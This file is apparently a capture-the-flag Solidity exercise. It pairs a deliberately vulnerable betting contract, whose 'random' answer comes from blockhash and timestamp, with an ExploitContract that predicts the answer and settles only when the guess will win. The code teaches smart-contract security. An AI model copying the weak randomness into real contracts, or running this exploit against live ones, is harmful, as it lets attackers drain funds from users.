// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "sender is not guesser");
        require(block.number > settlementBlockNumber, "too early to settle");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;
    uint8 public guess;
    uint256 public settlementBlockNumber;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    function randomness() public returns (uint8) {
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
    }

    function lock(uint8 _guess) public payable {
        guess = _guess;
        settlementBlockNumber = block.number + 1;
        predictTheFuture.lockInGuess{value: msg.value}(guess);
    }

    function settle() public returns (bool) {
        if (randomness() == guess && block.number > settlementBlockNumber) {
            predictTheFuture.settle();
            return true;
        }
        return false;
    }

    receive() external payable {}
}
